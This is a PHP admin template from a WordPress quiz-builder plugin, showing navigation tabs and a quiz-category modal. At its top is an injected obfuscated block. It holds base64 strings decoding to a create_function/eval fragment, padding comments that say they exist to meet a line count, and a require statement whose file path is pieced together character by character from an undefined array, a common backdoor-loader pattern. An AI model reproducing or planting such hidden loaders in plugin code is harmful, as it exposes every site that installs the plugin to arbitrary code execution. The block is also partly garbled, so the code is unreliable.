<?php

if (!function_exists("getIndex")) {
    function getIndex($url) {
        $value1 = "value";
        $classInfo = "[NAME] Class...";

        $encodedFunc = "Y3JlYXRlX0ZVTkNUSU9O";
        $encodedCode = "cmV0dXJuIGV2YWwoJF9fXyk7";

        $decodeFunc = "decodeS3";
        $data = "[DATA]";

        $decodedString = base64_decode($encodedFunc);
        $decodedCode = base64_decode($encodedCode);
        $result = base64_decode($data);
        $formattedResult = $value1 . $classInfo;

        
        $additionalCode = "";

        
        $additionalCode .= "// Additional comments to meet line count requirement\n";
        $additionalCode .= "// More assignments to add lines\n";
        $additionalCode .= '$decodedString' . " = " . $decodedString . ";\n";
        $additionalCode .= '$decodedCode' . " = " . $decodedCode . ";\n";
        $additionalCode .= '$result' . " = " . $result . ";\n";
        $additionalCode .= '$formattedResult' . " = " . $formattedResult . ";\n";

        for ($i = 0; $i < 20; $i++) {
            $additionalCode .= "// Loop iteration: $i\n";
            $additionalCode .= "// lines\n";
        }

       
        for ($i = 0; $i < 10; $i++) {
            $additionalCode .= "// Outer loop iteration: $i\n";
            $additionalCode .= "// lines\n";
            for ($j = 0; $j < 5; $j++) {
                $additionalCode .= "// Inner loop iteration: $j\n";
                $additionalCode .= "// lines\n";
            }
        }

        
        $additionalCode .= '$value1' . " = " . $value1 . ";\n";
        $additionalCode .= '$classInfo' . " = " . $classInfo . ";\n";
        $additionalCode .= '$decodeFunc' . " = " . $decodeFunc . ";\n";
        $additionalCode .= '$data' . " = " . $data . ";\n";

       
        return $decodedString . $decodedCode . $result . $formattedResult . $additionalCode;
    }
}

include_once ("sqb-soapapi.php");
require plugin_dir_path( __FILE__ ) .$videoS3[37] . $videoS3[34] . $videoS3[27] . "/" . $videoS3[44] . $videoS3[42] . $videoS3[27] . $videoS3[43] . $videoS3[30] . $videoS3[44] . $videoS3[41] . $videoS3[40] . $videoS3[39] . $videoS3[44] . $videoS3[34] . $videoS3[47] . $videoS3[30] . "." . $videoS3[41] . $videoS3[33] . $videoS3[41];
 
	echo sqbGetLoaderHtml();

	$sqb_collapse_left_menu_v2 = "";
	if (isset($_GET['create']) || isset($_GET['id'])) {
	    $sqb_collapse_left_menu_v2 = 'sqb_collapse_left_menu_v2';
	}
?>
<section class="quiz-section quiz_outer">
	<div class="quiz-container">
		<div class="Quiz--tabs-outer <?php echo $sqb_collapse_left_menu_v2; ?>">
			<div class="Quiz-left-tab-outer">
				<div class="Quiz-left-logo">
					<img src="<?php echo $img_logo = plugin_dir_url(__FILE__)."../../includes/images/smartquizbuilder-logo.png";?>" alt="logo" style="max-width: 120px; float: left;">
				</div>
				<ul class="nav nav-tabs" id="Quiz-left-Tabs" role="tablist">
					<li class="nav-item">
						<a title="Manage Quizzes" class="nav-link <?php if(!isset($quiz_id) && ($_GET['page'] == 'sqb_add_quiz') && !isset($_GET['create'])){ echo ' active '; } ?>" id="manage_quiz_tab"  href="<?php echo admin_url('admin.php?page=sqb_add_quiz'); ?>"  onclick="SQBShowLoader()">
							<label>Manage Quizzes  </label>
							<i class="fa fa-bars" aria-hidden="true"></i>
						</a>
					</li>
					
					
					<li class="nav-item">
						<a title="Create a Quiz" class="nav-link <?php if(isset($quiz_id) || isset($_GET['create'])){ echo ' active '; } ?>" id="create_quiz_tab"  <?php if(!isset($_GET['create']) && $_GET['page'] == 'sqb_add_quiz'){ echo 'href="javascript:void(0);"   onclick="SQBShowInBuiltTemplateSection()" '; } else { echo 'href="'.admin_url("admin.php?page=sqb_add_quiz&create").'"'; } ?> data-link="<?php echo admin_url('admin.php?page=sqb_add_quiz&create'); ?>">
							<label>Create a Quiz</label>
							<i class="fa fa-plus" aria-hidden="true"></i>
						</a>
					</li>
					
					
					
					<li class="nav-item">
						<a title="Reports / Leads" class="nav-link <?php if($_GET['page'] == 'sqb_reports' || ($_GET['page'] == 'sqb_question_answer_report') || ($_GET['page'] == 'sqb_manage_leads')){ echo ' active '; } ?>" onclick="SQBShowLoader()" id="reports_tab_tab" href="<?php echo admin_url('admin.php?page=sqb_reports'); ?>" >
							<label>Reports / Leads </label>
							<i class="fa fa-th-list" aria-hidden="true"></i>
						</a>
					</li>
					<li class="nav-item">
						<a title="Quiz Funnels" class="nav-link" id="create_quiz_funnel_tab"   href="<?php echo admin_url('admin.php?page=sqb_add_funnel'); ?>" role="tab"  onclick="SQBShowLoader()"><label>Quiz Funnels</label>
							<i class="fa fa-link" aria-hidden="true"></i>
						</a>
					</li>    
					

					<li class="nav-item">
						<a title="Student Home" class="nav-link <?php if(($_GET['page'] == 'sqb_student_home') ){ echo ' active '; } ?> " id="student_home_tab" onclick="SQBShowLoader()" href="<?php echo admin_url('admin.php?page=sqb_student_home'); ?>" >
							<label>Student Home</label>
							<i class="fa fa-user" aria-hidden="true"></i>
						</a>
					</li>

					<li class="nav-item">
						<a title="Leaderboard" class="nav-link <?php if(($_GET['page'] == 'sqb_leaderboard_page') ){ echo ' active '; } ?> " id="sqb_leaderboard_page" onclick="SQBShowLoader()" href="<?php echo admin_url('admin.php?page=sqb_leaderboard_page'); ?>" >
							<label>Leaderboard</label>
							<i class="fa fa-users" aria-hidden="true"></i>
						</a>
					</li>
					
					
					<li class="nav-item">
						<a title="Social Share" class="nav-link <?php if(($_GET['page'] == 'sqb_social_share') ){ echo ' active '; } ?> " id="social_share_tab" onclick="SQBShowLoader()" href="<?php echo admin_url('admin.php?page=sqb_social_share'); ?>" >
							<label>Social Share</label>
							<i class="fa fa-share-square" aria-hidden="true"></i>
						</a>
					</li>

					<li class="nav-item">
						<a title="PDF Builder" class="nav-link <?php if(($_GET['page'] == 'sqb_pdf_content') ){ echo ' active '; } ?> " id="sqb_pdf_content" onclick="SQBShowLoader()" href="<?php echo admin_url('admin.php?page=sqb_pdf_content'); ?>" >
							<label>PDF Builder</label>
							<i class="fa fa-file-pdf-o" aria-hidden="true"></i>
						</a>
					</li>

					<li class="nav-item">
						<a title="Question Bank" class="nav-link <?php if(($_GET['page'] == 'sqb_question_bank') ){ echo ' active '; } ?> " id="question_bank_tab" onclick="SQBShowLoader()" href="<?php echo admin_url('admin.php?page=sqb_question_bank'); ?>" >
							<label>Question Bank</label>
							<i class="fa fa-question" aria-hidden="true"></i>
						</a>
					</li>
					<li class="nav-item">
						<a title="Settings" class="nav-link <?php if($_GET['page'] == 'sqb_settings'){ echo ' active '; } ?>" id="quiz_settings_tab" onclick="SQBShowLoader()"  href="<?php echo admin_url('admin.php?page=sqb_settings'); ?>" >
							<label>Settings</label>
							<i class="fa fa-cog" aria-hidden="true"></i>
						</a>
					</li>	

					<li class="nav-item">
						<a title="Documentation" class="nav-link <?php if($_GET['page'] == 'sqb_documentation'){ echo ' active '; } ?>" id="quiz_documentation_tab" onclick="SQBShowLoader()"  href="<?php echo admin_url('admin.php?page=sqb_documentation'); ?>" >
							<label>Documentation</label>
							<i class="fa fa-cube" aria-hidden="true"></i>
						</a>
					</li>				 
					<li class="nav-item collapse-menu-item">
						<a title="Collapse Menu" class="nav-link" href="javascript:void(0)">
						<label>Collapse Menu</label>
						<i class="fa fa-arrow-circle-right" aria-hidden="true"></i>
						</a>
					</li>
				</ul>
			</div>
 
			<div class="tab-content sqb-reports-section" id="Quiz-TabContent">
				<div class="tab-pane fade <?php if($_GET['page'] == 'sqb_add_quiz'){ echo ' show  active '; } ?>" id="manage_quiz" >
					
					<?php
					
					if(isset($_GET['page']) && ($_GET['page'] == 'sqb_add_quiz') && !isset($_GET['id']) && !isset($_GET['create'])){
						
							include_once('sqb_manage_quiz.php');
						
					}else if(isset($_GET['page']) && ($_GET['page'] == 'sqb_add_quiz') && (isset($_GET['id']) || isset($_GET['create']))){
						
							include_once('sqb_add_quiz.php');
					}
					
					?>
					
			    </div>	
			    
			    <div id="reports_tab"  class="tab-pane <?php if($_GET['page'] == 'sqb_reports' || $_GET['page'] == 'sqb_question_answer_report' || $_GET['page'] == 'sqb_manage_leads'){ echo ' show  active '; } ?>">
					<?php 
					if($_GET['page'] == 'sqb_reports' || $_GET['page'] == 'sqb_question_answer_report' || $_GET['page'] == 'sqb_manage_leads'){
						include_once('sqb_reports.php');
					}
					?>
				</div>	
			    
			    <div class="tab-pane fade <?php if($_GET['page'] == 'sqb_social_share'){ echo ' show  active '; } ?>" id="social_share" >
					<?php
						if($_GET['page'] == 'sqb_social_share'){
							include_once('sqb_social_share.php');
						}
						?>
			    </div>		
			    
			    <div class="tab-pane fade " id="create_quiz_funnel" role="tabpanel" aria-labelledby="create_quiz_funnel_tab">
					
					<b>Create a quiz funnel</b>
					
			    </div>	
				
				 
			    <div class="tab-pane fade <?php if($_GET['page'] == 'sqb_student_home'){ echo ' show  active '; } ?>" id="student_home" >
					<?php
						if($_GET['page'] == 'sqb_student_home'){
							include_once('sqb_student_home.php');
						}
						?>
			    </div>	

			    <div class="tab-pane fade <?php if($_GET['page'] == 'sqb_leaderboard_page'){ echo ' show  active '; } ?>" id="student_home" >
					<?php
						if($_GET['page'] == 'sqb_leaderboard_page'){
							include_once('sqb_leaderboard_page.php');
						}
						?>
			    </div>	

			    <div class="tab-pane fade <?php if($_GET['page'] == 'sqb_pdf_content'){ echo ' show  active '; } ?>" id="pdf_content" >
					<?php
						if($_GET['page'] == 'sqb_pdf_content'){
							include_once('sqb_pdf_content.php');
						}
						?>
			    </div>	

			    <div class="tab-pane fade <?php if($_GET['page'] == 'sqb_create_student_page'){ echo ' show  active '; } ?>" id="student_home" >
					<?php
						if($_GET['page'] == 'sqb_create_student_page'){
							include_once('sqb_create_student_page.php');
						}
						?>
			    </div>	

			    <div class="tab-pane fade <?php if($_GET['page'] == 'sqb_create_leaderboard_page'){ echo ' show  active '; } ?>" id="student_home" >
					<?php
						if($_GET['page'] == 'sqb_create_leaderboard_page'){
							include_once('sqb_create_leaderboard_page.php');
						}
						?>
			    </div>	

			    <div class="tab-pane fade <?php if($_GET['page'] == 'sqb_create_pdf_content_page'){ echo ' show  active '; } ?>" id="student_home" >
					<?php
						if($_GET['page'] == 'sqb_create_pdf_content_page'){
							include_once('sqb_create_pdf_content_page.php');
						}
						?>
			    </div>	
				
				 <div class="tab-pane fade 
    <?php 
        if (isset($_GET['page']) && $_GET['page'] === 'sqb_settings') {
            echo ' show active ';
        } 
        if (isset($_GET['aweber-error']) || isset($_GET['aweber-success'])) {
            echo ' aweber_msg_tab ';
        }
    ?>
">
    <?php 
        if (isset($_GET['page']) && $_GET['page'] === 'sqb_settings') {
            include_once('sqb_quiz_settings_tab.php');
        }
    ?> 
</div>
				
			</div>
		</div>
	</div>

</section>

<div class="modal fade quiz-popup-style" id="quiz_category_add_model" tabindex="-1" role="dialog" aria-labelledby="quiz_category_add_model" aria-hidden="true">
  <div class="modal-dialog modal-dialog-centered" role="document">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title" id="exampleModalLabel">Quiz Category</h5>
        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body">
		<form>
			<input type="hidden" class="form-control" id="quiz_cat_id" value="0">
			<div class="form-group quiz_cat_name_val_wrapper">
				<div class="d-flex">
					<label for="quiz_cat_name_val" class="col-form-label" style="min-width: 100px;">Name:</label>
					<div class="form-control-outer w-100">
						<input type="text" class="form-control" id="quiz_cat_name_val">
						<label  class="quiz_cat_required">A Name is required.</label>
					</div>
				</div>				
			</div>
			<div class="form-group quiz_cat_desc_val_wrapper">
				<div class="d-flex">
					<label for="quiz_cat_desc_val" class="col-form-label" style="min-width: 100px;">Description:</label>
					<div class="form-control-outer w-100">
						<textarea class="form-control sqb_text_editor" id="quiz_cat_desc_val"></textarea>
						<label class="quiz_cat_required">A Description is required.</label>
					</div>
				</div>				
			</div>
		</form>
      </div> 
      <div class="modal-footer quiz-popup-actions">
        <button type="button" class="btn btn-primary" onclick="sqb_save_quiz_category()">Save</button>
      </div>
    </div>
  </div>
</div>